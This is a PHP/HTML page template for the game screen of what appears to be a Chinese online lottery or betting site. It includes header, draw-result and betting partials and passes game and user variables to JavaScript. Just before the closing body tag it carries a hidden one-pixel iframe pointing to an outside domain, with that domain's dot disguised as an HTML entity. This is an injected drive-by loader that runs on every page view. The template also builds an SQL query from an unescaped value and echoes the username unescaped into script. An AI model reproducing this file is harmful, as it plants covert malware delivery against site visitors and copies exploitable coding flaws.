<!DOCTYPE HTML>
<html>
<head>
<?php 
if($this->type){
	$row=$this->getRow("select enable,title from {$this->prename}type where id={$this->type}");
	if(!$row['enable']){
		echo $row['title'].'已经关闭';
		exit;
	}
}else{
	$this->type=1;
	$this->groupId=2;
	$this->played=10;
}
?>
<?php $this->display('inc_game_lr.php',0,''); ?>
</head>
<body>
<style type="text/css">
.a2{background-position: -32px -152px;}
.a2color{color:#08a09d}
.cp_home .arrowtwo {background-position: -32px 0px;}
</style>
<!--页头-->
<?php $this->display('index/inc_header.php'); ?>
<!--游戏界面开始-->

	<div style="width:100%;height: 633px;background: url(/img/game/bg.jpg) no-repeat center top;">
	<div style="width: auto;height: 14px;"></div>
<!--开奖号--><div style="width: 1030px;margin:0 auto;">
					<div class="game_kj">
					<?php $this->display('index/inc_data_current.php'); ?>
			 </div>

 <!--投注选号标签开始-->
			<div class="game">
  					<div class="gm_con_to" style="background-color:#f5f5f5;">
					<?php $this->display('index/inc_game.php'); ?>
   					</div>
					</div>
</div>
</div>
</div>
<!--游戏界面end-->
<?php $this->display('inc_footer.php'); ?>
<script type="text/javascript">
var game={
	type:<?=json_encode($this->type)?>,
	played:<?=json_encode($this->played)?>,
	groupId:<?=json_encode($this->groupId)?>
},
user="<?=$this->user['username']?>",
aflag=<?=json_encode($this->user['admin']==1)?>;
</script>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>
  
   
 